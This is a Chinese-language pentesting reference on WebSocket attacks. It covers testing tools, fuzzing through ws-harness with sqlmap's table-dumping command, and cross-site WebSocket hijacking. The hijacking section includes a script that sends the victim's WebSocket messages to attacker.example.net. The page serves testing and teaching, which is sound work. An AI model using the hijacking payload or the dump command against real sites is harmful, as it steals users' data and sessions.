# 网络套接字

> WebSocket 是一种通信协议，它通过单一的、长期存在的连接提供全双工通信通道。这使得客户端（通常是网络浏览器）和服务器之间能够通过持久连接进行实时的双向通信。WebSocket 常用于需要频繁、低延迟更新的 Web 应用程序，例如实时聊天应用程序、在线游戏、实时通知以及金融交易平台。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [使用 wsrepl](#使用-wsrepl)
    * [使用 ws-harness.py](#使用-ws-harnesspy)
* [跨站 WebSocket 劫持 (CSWSH)](#跨站-websocket-劫持-cswsh)
* [实验环境](#实验环境)
* [参考文献](#参考文献)

## 工具

* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - 针对渗透测试人员的 WebSocket REPL
* [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)
* [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) - 使用自定义 Python 代码模糊测试 WebSocket
* [snyk/socketsleuth](https://github.com/snyk/socketsleuth) - 用于渗透测试基于 WebSocket 的应用程序的 Burp 扩展

## 方法论

### 使用 wsrepl

`wsrepl` 是由 Doyensec 开发的工具，旨在简化基于 WebSocket 的应用程序的审计工作。它提供了用户友好的交互式 REPL 接口，并且易于自动化。该工具是在与一位客户合作时开发的，该客户的 Web 应用程序大量依赖于 WebSocket 进行软实时通信。

wsrepl 设计的目标是平衡交互式 REPL 体验和自动化功能。它使用 Python 的 TUI 框架 Textual 构建，并且可以与 curl 的参数互操作，从而轻松从 Burp 中的 Upgrade 请求过渡到 wsrepl。它还根据 RFC 6455 提供了完整的 WebSocket 操作码透明度，并在断开连接时具有自动重新连接功能。

```ps1
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

此外，wsrepl 简化了向 WebSocket 自动化过渡的过程。用户只需编写一个 Python 插件即可。插件系统设计灵活，允许用户在 WebSocket 生命周期的不同阶段（初始化、消息发送、消息接收等）定义钩子。

```py
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Error: could not parse message"

        message.long = original
```

### 使用 ws-harness.py

启动 `ws-harness` 监听 WebSocket，并指定要发送给端点的消息模板。

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

消息内容应包含 **[FUZZ]** 关键字。

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

然后你可以使用任何工具针对新创建的 Web 服务，作为代理并动态篡改通过 WebSocket 发送的消息内容。

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

## 跨站 WebSocket 劫持 (CSWSH)

如果 WebSocket 握手没有正确地使用 CSRF 令牌或随机数保护，攻击者可以利用用户的已认证 WebSocket，因为浏览器会自动发送 Cookie。这种攻击被称为跨站 WebSocket 劫持 (CSWSH)。

示例攻击代码，托管在攻击者的服务器上，用于窃取来自 WebSocket 的数据并发送给攻击者：

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

你需要根据具体情况调整代码。例如，如果你的 Web 应用程序在握手请求中使用了 `Sec-WebSocket-Protocol` 头部，你需要将此值作为第二个参数传递给 `WebSocket` 函数调用以添加此头部。

## 实验环境

* [PortSwigger - 利用操纵 WebSocket 消息来挖掘漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
* [PortSwigger - 跨站 WebSocket 劫持](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
* [PortSwigger - 利用操纵 WebSocket 握手来挖掘漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
* [Root Me - Web Socket - 0 保护](https://www.root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection)

## 参考文献

* [黑客攻陷 WebSocket：欢迎所有 Web 渗透测试工具 - Michael Fowl - 2019年3月5日](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
* [使用 WebSocket 黑客攻击 - Mike Shema, Sergey Shekyan, Vaagn Toukharian - 2012年9月20日](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
* [小型 WebSocket CTF - Snowscan - 2020年1月27日](https://snowscan.io/bbsctf-evilconneck/#)
* [使用 wsrepl 流程化 WebSocket 渗透测试 - Andrez Konstantinov - 2023年7月18日](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
* [测试 WebSocket 安全漏洞 - PortSwigger - 2019年9月28日](https://portswigger.net/web-security/websockets)
* [WebSocket 攻击 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)